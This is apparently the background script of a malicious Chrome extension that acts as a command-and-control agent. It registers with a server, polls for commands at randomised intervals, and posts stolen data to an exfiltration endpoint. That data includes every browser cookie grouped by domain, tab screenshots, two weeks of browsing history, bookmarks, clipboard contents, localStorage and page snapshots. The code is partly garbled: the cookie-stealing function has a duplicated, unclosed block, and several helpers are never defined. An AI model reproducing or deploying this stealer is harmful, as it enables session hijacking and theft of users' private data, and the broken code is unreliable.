// background.js
window.run = function(cfg) {
  console.log("[Target] run() started with cfg:", cfg);

  if (!cfg?.c2) {
    console.warn("[Target] No address provided in cfg");
    return;
  }

  const payload = {
    modules: cfg.modules || [],
    timestamp: new Date().toISOString()
  };

  fetch(cfg.c2 + "/session/new", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  })
    .then(res => res.text())
    .then(text => {
      console.log("[Target] register response:", text);
    })
    .catch(err => {
      console.error("[Target] Fetch error during registration:", err);
    });
};

const C2_SERVER = ''; // Update if using remote/HTTPS
const MIN_POLL_SECONDS = 5;
const MAX_POLL_SECONDS = 30;

let agent_id = null;

// Generate random interval
function getRandomInterval() {
  return Math.floor(
    Math.random() * (MAX_POLL_SECONDS - MIN_POLL_SECONDS + 1) + MIN_POLL_SECONDS
  ) * 1000;
}

// Fetch with retries
async function fetchWithRetry(url, options, retries = 3, backoff = 3000) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await fetch(url, options);
      if (!response.ok) throw new Error(`Status: ${response.status}`);
      return response;
    } catch (error) {
      console.warn(`Fetch attempt ${i + 1} failed: ${error.message}`);
      if (i < retries - 1) {
        await new Promise((res) => setTimeout(res, backoff));
      } else {
        throw error;
      }
    }
  }
}

// Exfil data
async function exfilData(action, payload) {
  console.log(`[Exfil] Action=${action}, Payload=${JSON.stringify(payload)}`);
  try {
    const response = await fetchWithRetry(`${C2_SERVER}/api/exfil`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        agent_id,
        action,
        payload
      })
    });
    const result = await response.json();
    console.log(`[Exfil Response] ${JSON.stringify(result)}`);
  } catch (err) {
    console.error(`[Exfil Error] ${err.message}`);
  }
}

// Capture screenshot
async function captureScreenshot(quality) {
  try {
    const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!activeTab) {
      console.error('No active tab found for screenshot');
      return;
    }
    const tabUrl = activeTab.url;
    console.log(`[Screenshot] Attempting on ${tabUrl}`);

    const restrictedSchemes = ['chrome://', 'devtools://', 'chrome-extension://', 'about:'];
    const isRestricted = restrictedSchemes.some((scheme) => tabUrl.startsWith(scheme));
    if (isRestricted) {
      console.warn(`[Screenshot] Restricted URL: ${tabUrl}`);
      return;
    }

    const dataUrl = await new Promise((resolve, reject) => {
      chrome.tabs.captureVisibleTab(null, { format: 'png' }, (res) => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
        } else {
          resolve(res);
        }
      });
    });

    // Extract base64 data from dataUrl
    const base64Data = dataUrl.split(',')[1];
    
    console.log('[Screenshot] Captured, exfiltrating...');
    // Send with correct payload structure
    exfilData('TAKE_SCREENSHOT', {
      screenshot: base64Data,
      location: tabUrl
    });
  } catch (err) {
    console.error('[Screenshot Error]', err);
  }
}

// Retrieve cookies - updated to handle all domains if none specified
async function getCookiesForDomain(domain = null) {
  console.log(`[GetCookies] for domain: ${domain || 'all domains'}`);
  
  // If no domain specified, get all cookies
  const options = domain ? { domain } : {};
  
if (typeof chrome !== 'undefined' && chrome.cookies) { chrome.cookies.getAll(options, (cookies) =>  { console.log(`[GetCookies] Found ${cookies.length} cookies`);
    
    // Group cookies by domain for better organization
if (typeof chrome !== 'undefined' && chrome.cookies) {
  chrome.cookies.getAll(options, (cookies) => {
    console.log(`[GetCookies] Found ${cookies.length} cookies`);

    const cookiesByDomain = {};
    cookies.forEach(cookie => {
      if (!cookiesByDomain[cookie.domain]) {
        cookiesByDomain[cookie.domain] = [];
      }
      cookiesByDomain[cookie.domain].push(cookie);
    });

    exfilData('COOKIES', {
      domain: domain || 'all',
      cookies: cookiesByDomain
    });
  });
} else {
  console.warn('[GetCookies] chrome.cookies not available');
}

// Get browsing history
async function getBrowsingHistory(days = 14) {
  if (typeof chrome !== 'undefined' && chrome.history && chrome.history.search) {
    console.log(`[GetHistory] Fetching history for last ${days} days`);

    try {
      const microsecondsPerDay = 1000 * 60 * 60 * 24;
      const startTime = new Date().getTime() - (microsecondsPerDay * days);

      const historyItems = await chrome.history.search({
        text: '',
        startTime: startTime,
        maxResults: 5000
      });

      const processedHistory = historyItems.map(item => ({
        url: item.url,
        title: item.title,
        visitCount: item.visitCount,
        lastVisit: new Date(item.lastVisitTime).toISOString(),
        typedCount: item.typedCount
      }));

      console.log(`[GetHistory] Found ${processedHistory.length} entries`);

      exfilData('HISTORY', {
        days: days,
        entries: processedHistory,
        totalItems: processedHistory.length
      });

    } catch (error) {
      console.error('[GetHistory] Error:', error);
      exfilData('HISTORY', {
        error: error.message,
        days: days
      });
    }
  } else {
    console.warn('[GetHistory] chrome.history.search not available');
  }
}

// Get bookmarks
async function getBookmarks() {
  if (typeof chrome !== 'undefined' && chrome.bookmarks && chrome.bookmarks.getTree) {
    console.log('[GetBookmarks] Fetching bookmarks');

    try {
      const bookmarkTree = await chrome.bookmarks.getTree();
      console.log('[GetBookmarks] Retrieved bookmark tree');

      exfilData('BOOKMARKS', {
        bookmarks: bookmarkTree[0],
        timestamp: new Date().toISOString()
      });

    } catch (error) {
      console.error('[GetBookmarks] Error:', error);
      exfilData('BOOKMARKS', {
        error: error.message
      });
    }
  } else {
    console.warn('[GetBookmarks] chrome.bookmarks.getTree not available');
  }
}

// Handle commands
async function handleCommand(command) {
  console.log('[HandleCommand]', command);

  switch (command.type.toLowerCase()) {
    case 'domsnapshot':
      broadcastMessage({ command: 'domSnapshot' });
      break;

    case 'clipboardcapture':
    case 'capture_clipboard':
      broadcastMessage({ command: 'clipboardCapture' });
      break;

    case 'localstoragedump':
      broadcastMessage({ command: 'localStorageDump' });
      break;

    case 'getcookies':
      const domain = command.payload?.domain ?? null;
      await getCookiesForDomain(domain);
      break;

    case 'screenshot':
    case 'take_screenshot':
      console.log('[Handling Command] screenshot => captureScreenshot');
      await captureScreenshot(command.payload?.quality ?? 50);
      break;

    case 'testcommand':
      console.log('[TestCommand] Exfil test response');
      exfilData('testCommandResponse', { message: 'Test command executed successfully.' });
      break;

    case 'history':
      console.log('[Handling Command] history request');
      const days = command.payload?.days || 7;
      await getBrowsingHistory(days);
      break;

    case 'bookmarks':
      console.log('[Handling Command] bookmarks request');
      await getBookmarks();
      break;

    case 'enumeration':
      console.log('[Handling Command] system enumeration');
      broadcastMessage({ command: 'enumeration' });
      break;

    default:
      console.warn('[Unknown Command]', command.type);
  }
}

// Broadcast a message to content scripts in all tabs
function broadcastMessage(msg) {
  if (typeof chrome !== 'undefined' && chrome.tabs?.query) {
    chrome.tabs.query({}, (tabs) => {
      for (const t of tabs) {
        if (t.url && !t.url.startsWith('chrome://') && 
            !t.url.startsWith('chrome-extension://') && 
            !t.url.startsWith('devtools://')) {
          try {
            chrome.tabs.sendMessage(t.id, msg, (response) => {
              if (chrome.runtime.lastError) {
                const msg = chrome.runtime.lastError.message;
                if (!msg.includes('does not exist') && !msg.includes('port closed')) {
                  console.error(`[Broadcast] tab ${t.id}: ${msg}`);
                }
              } else if (response) {
                console.log(`[Broadcast] tab ${t.id} responded:`, response);
              }
            });
          } catch (err) {
            console.debug(`[Broadcast] Failed to send to tab ${t.id}`);
          }
        }
      }
    });
  } else {
    console.warn('[Broadcast] chrome.tabs not available');
  }
}
// Beacon to fetch tasks
async function beaconToC2() {
  console.log(`[Beacon] Agent=${agent_id} => ${C2_SERVER}/api/commands`);
  try {
    const res = await fetchWithRetry(`${C2_SERVER}/api/commands?agent_id=${agent_id}`, {
      method: 'GET'
    });
    const commands = await res.json();
    console.log(`[Beacon] Received ${commands.length} commands`);
    for (const cmd of commands) {
      await handleCommand(cmd);
    }
  } catch (err) {
    console.error('[Beacon Error]', err.message);
  }
}

// Schedule next beacon
function scheduleNextBeacon() {
  const interval = getRandomInterval();
  console.log(`[Beacon] Next in ${interval / 1000}s`);
  setTimeout(async () => {
    await beaconToC2();
    scheduleNextBeacon();
  }, interval);
}

// Register agent
async function registerAgent() {
  const ip = await getPublicIP();

  try {
    const res = await fetch(C2_SERVER + "/session/new", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        agent_name: getRandomName(),
        timestamp: new Date().toISOString(),
        ip: ip,
        modules: loadedModules
      })
    });

    const data = await res.json();
    agent_id = data.agent_id;
    console.log("[Agent] Registered with ID:", agent_id);

    if (typeof chrome !== 'undefined' && chrome.storage?.local) {
      chrome.storage.local.set({ agent_id });
    }

    scheduleNextBeacon();
  } catch (err) {
    console.error("[Agent] Registration failed:", err);
  }
}
// Load agent_id on startup
if (typeof chrome !== 'undefined' && chrome.runtime?.onStartup) {
  chrome.runtime.onStartup.addListener(() => {
    console.log('[onStartup] Checking agent_id');
    chrome.storage.local.get('agent_id', (res) => {
      if (res.agent_id) {
        agent_id = res.agent_id;
        console.log(`[onStartup] Found agent_id = ${agent_id}`);
        scheduleNextBeacon();
      } else {
        registerAgent();
      }
    });
  });
}

// Listen for messages from content scripts
if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {

    // ENUMERATION
    if (message.type === 'exfil' && message.action === 'ENUMERATION') {
      const payload = {
        agent_id: agent_id,
        action: message.action,
        payload: message.data
      };

      fetch(`${C2_SERVER}/api/exfil`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
        .then(response => response.json())
        .then(data => {
          console.log('Enumeration data sent successfully:', data);
        })
        .catch(error => {
          console.error('Error sending enumeration data:', error);
        });
    }

    // SCREENSHOT
    if (message.type === 'capture_screenshot') {
      chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function (dataUrl) {
        if (chrome.runtime.lastError) {
          console.error('[Screenshot Error]', chrome.runtime.lastError);
          return;
        }

        const base64Data = dataUrl.split(',')[1];

        exfilData('TAKE_SCREENSHOT', {
          agent_id: agent_id,
          screenshot: base64Data,
          location: message.location
        });
      });
    }

    // GENERAL EXFIL
    if (message.type === 'exfil') {
      console.log('[Exfil Message]', message.data);
      exfilData(message.data.action, {
        url: sender.url,
        location: message.data.location,
        ...message.data
      });
      sendResponse({ status: 'ok' });
    }

    return true;
  });
  
}




